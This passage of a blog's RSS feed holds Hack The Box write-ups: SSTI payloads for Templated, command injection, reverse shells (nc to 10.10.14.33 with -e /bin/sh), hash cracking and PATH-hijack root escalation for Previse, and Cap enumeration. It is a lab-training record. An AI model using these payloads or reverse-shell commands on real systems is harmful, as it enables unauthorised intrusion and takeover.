	        <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(cat flagQLGyS)&#39;)&#34;</span>
		    }
		}
</code></pre></div><pre><code>- Output:
</code></pre>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">	&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(cat flagQLGyS)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
	&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
</code></pre></div><p>References:</p>
<ul>
<li>(Peak resource) <a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB Templated - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-templated/</link>
            <pubDate>Sun, 26 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
            <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
We know that it is Jinja2 and Flask, so we can use their payload.
Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
Alternative Finding subprocess.Popen index.
 GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;.</description>
            <content type="html"><![CDATA[<h2 id="navigating-through-the-website">Navigating through the website</h2>
<p>Requested: <code>GET /invalid</code> -&gt; we got <code>invalid</code></p>
<p><img src="/img/templated/Pasted%20image%2020211226121920.png" alt=""></p>
<h2 id="verifying-if-ssti-is-possible">Verifying if SSTI is possible</h2>
<p>Requested: <code>GET /invalid{{7*7}}</code> -&gt; we got <code>invalid49</code> instead of <code>invalid{{7*7}}</code></p>
<p><img src="/img/templated/Pasted%20image%2020211226121844.png" alt=""></p>
<p>We know that it is Jinja2 and Flask, so we can use their payload.</p>
<h2 id="getting-the-flag">Getting the flag</h2>
<p>Requested: <code>GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}</code> -&gt; we got the flag</p>
<p><img src="/img/templated/Pasted%20image%2020211226182358.png" alt=""></p>
<h3 id="alternative">Alternative</h3>
<p><strong>Finding <code>subprocess.Popen</code> index.</strong></p>
<ol>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[100:]</code> -&gt; Popen is there in the list
<img src="/img/templated/Pasted%20image%2020211226184612.png" alt=""></li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[300:]</code> -&gt; Popen is there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[500:]</code> -&gt; Internal Server Error</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[400:]</code> -&gt; Popen is there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[450:]</code> -&gt; Popen is NOT there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]</code> -&gt; Popen exists</li>
</ol>
<p><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
<p>References:</p>
<ul>
<li><a href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a></li>
<li><a href="https://blog.nvisium.com/p255">https://blog.nvisium.com/p255</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB Previse - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-previse/</link>
            <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-previse/</guid>
            <description>Enumeration Initial Enumeration Nmap Scans Initial:
PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="initial-enumeration">Initial Enumeration</h2>
<h4 id="nmap-scans">Nmap Scans</h4>
<p>Initial:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT      STATE    SERVICE    REASON
22/tcp    open     ssh        syn-ack
80/tcp    open     http       syn-ack
</code></pre></div><p>Service Scan:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<h4 id="ffuf">Ffuf</h4>
<p>common.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
accounts.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
download.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
files.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
logs.php                [Status: 200, Size: 2224, Words: 486, Lines: 54]
logout.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
status.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
</code></pre></div><p>medium.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -c -ic -of html -o http-medium.html
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
</code></pre></div><h4 id="sql-injections">SQL injections</h4>
<p><code>/login.php</code></p>
<ul>
<li>None of the sql injections worked.</li>
<li><code>sqlmap</code> also did not work</li>
<li>Request:
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">POST /login.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-GPC: 1
Referer: http://10.10.11.104/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=4natd10ok9pjvsrsuhr4ql0ktq
Connection: close
  
username=&#39;+OR+1=1;--&amp;password=&#39;+OR+1=1;--
</code></pre></div><pre><code>
</code></pre></li>
</ul>
<h1 id="initial-foothold">Initial Foothold</h1>
<h3 id="accountsphp">/accounts.php</h3>
<p>Request of <code>accounts.php</code> is redirected to -&gt; <code>login.php</code></p>
<p>But when intercepted with Burp, we have interesting results</p>
<p><img src="/img/previse/Pasted%20image%2020211225134915.png" alt=""></p>
<p>If we send a post request, we can create a new user
<img src="/img/previse/Pasted%20image%2020211225134951.png" alt=""></p>
<h4 id="sending-the-post-request">Sending the POST request</h4>
<p>Request:</p>
<p><img src="/img/previse/Pasted%20image%2020211225135604.png" alt=""></p>
<p>Response:
<img src="/img/previse/Pasted%20image%2020211225135625.png" alt=""></p>
<p>So now we have a user with username and password as <code>fakebatman:fakebatman</code></p>
<h2 id="getting-user-shell">Getting user shell</h2>
<p>The logs file executes a python script and appends a delimiter that is parsed through a POST parameter</p>
<p><em>logs.php</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
</span><span style="color:#75715e"></span>
$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">&#39;delim&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
<span style="color:#66d9ef">echo</span> $output;
</code></pre></div><p>So when we send the delim=<code>;ping 10.10.14.33 -c 5</code> and we run <code>tcpdump</code> to check if we are actually receiving any pings, we get ping hits.</p>
<p>Appending the command:</p>
<p><img src="/img/previse/Pasted%20image%2020211225175758.png" alt=""></p>
<p>And we get the ping hits:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tcpdump -i tun0 icmp
</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225180213.png" alt=""></p>
<h3 id="getting-a-reverse-shell-www-data">Getting a reverse shell (www-data)</h3>
<p>Start a reverse shell</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -nlvp <span style="color:#ae81ff">4444</span>
</code></pre></div><p>Send the request</p>
<p><img src="/img/previse/Pasted%20image%2020211225180452.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">delim=;nc+10.10.14.33+4444+-e+/bin/sh
</span></code></pre></div><p>And we get a reverse shell</p>
<p><img src="/img/previse/Pasted%20image%2020211225180415.png" alt=""></p>
<h3 id="mysql-recon">MySQL recon</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u root -p
mysql&gt; SELECT * FROM accounts;
SELECT * FROM accounts;
+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  <span style="color:#ae81ff">1</span> | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
</code></pre></div><p>Saving the hash into a file <code>m4lwhere.hash</code> and cracking the hash using hashcat</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">500</span> -a <span style="color:#ae81ff">0</span> m4lwhere.hash /usr/share/wordlists/rockyou.txt
</code></pre></div><p>The cracked password</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
</code></pre></div><h3 id="logging-in-using-these-creds">Logging in using these creds</h3>
<p>and hoping for a password reuse</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh m4lwhere@10.10.11.104
</code></pre></div><p>and <code>ilovecody112235!</code> as password we get a SSH shell</p>
<p><img src="/img/previse/Pasted%20image%2020211225183445.png" alt=""></p>
<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
<h3 id="sudo--l">sudo -l</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">m4lwhere@previse:~$ sudo -l
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> m4lwhere:
User m4lwhere may run the following commands on previse:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /opt/scripts/access_backup.sh
</code></pre></div><p><em>access_backup.sh</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
</code></pre></div><p>Absolute paths for <code>gzip</code> and <code>date</code> is not mentioned.</p>
<h3 id="creating-a-new-file">Creating a new file</h3>
<p>Going to <code>/tmp</code> directory and creating a <code>date</code> file with contents</p>
<p><em>date</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 10.10.14.33 <span style="color:#ae81ff">9001</span> -e /bin/bash
</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225192245.png" alt=""></p>
<p>And then we add <code>tmp/</code> directory to the path</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export PATH<span style="color:#f92672">=</span>tmp:/$PATH
</code></pre></div><p>Now we run our script</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /opt/scripts/access_backup.sh
</code></pre></div><p>And we get a shell on our reverse tcp listener
<img src="/img/previse/Pasted%20image%2020211225192210.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Cap - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-cap/</link>
            <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-cap/</guid>
            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up (0.068s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Fri, 16 Jul 2021 15:14:15 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | &amp;lt;!</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap-scans">Nmap Scans</h2>
<h3 id="service-scan">Service Scan</h3>
<pre><code># Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:15 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &lt;!DOCTYPE html&gt;
|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;
|     &lt;!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/16%Time=60F1A242%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Fri,\x2016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\
SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2
SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\
SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=
SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image
SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;
SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;
SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon
SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2
SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.
SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c
SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption
SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,\x2
SF:016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189
SF:,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20F
SF:ri,\x2016\x20Jul\x202021\x2015:14:15\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 16 20:47:13 2021 -- 1 IP address (1 host up) scanned in 190.95 seconds
</code></pre><ul>
<li>Port 21, 80 open</li>
</ul>
<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<ul>
<li>gunicorn</li>
</ul>
<h3 id="ip"><code>/ip</code></h3>
<p>Runs <code>ifconfig</code> on the machine</p>
<p><img src="/img/cap/Pasted_image_20210716205953.png" alt="/img/cap/Pasted_image_20210716205953.png"></p>
<h3 id="netstat"><code>/netstat</code></h3>
<p>Runs <code>netstat</code> on the machine</p>
<h3 id="capture"><code>/capture</code></h3>
<p>Captures PCAP packets of the server and made available for download</p>
<h3 id="ffuf-scan">ffuf scan</h3>
<pre><code>$ ffuf -u &lt;http://10.10.10.245/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -v -c -ic -of html -o http/http-80-medium-no-ext.html

         /'___\\  /'___\\           /'___\\
        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : &lt;http://10.10.10.245/FUZZ&gt;
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Output file      : http/http-80-medium-no-ext.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/&gt;
    * FUZZ:

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/data&gt;
    * FUZZ: data

[Status: 200, Size: 17445, Words: 7275, Lines: 355]
| URL | &lt;http://10.10.10.245/ip&gt;
    * FUZZ: ip

[Status: 200, Size: 72923, Words: 36727, Lines: 768]
| URL | &lt;http://10.10.10.245/netstat&gt;
    * FUZZ: netstat

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/capture&gt;
    * FUZZ: capture

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/&gt;
    * FUZZ:

:: Progress: [207630/207630] :: Job [1/1] :: 633 req/sec :: Duration: [0:05:37] :: Errors: 0 ::

</code></pre><pre><code>/
/data
/ip
/capture
/netstat

</code></pre><ul>
<li>
<p>The packets captured on <code>/capture</code> are available as <code>/data/1</code> and so forth. The number starts from 1.</p>
</li>
<li>
<p>Opening <code>/data/0</code> being packet not captured by us. Might find something juicy.</p>
</li>
<li>
<p>Downloading it and opening in wireshark</p>
<p><img src="/img/cap/Pasted_image_20210717190239.png" alt="/img/cap/Pasted_image_20210717190239.png"></p>
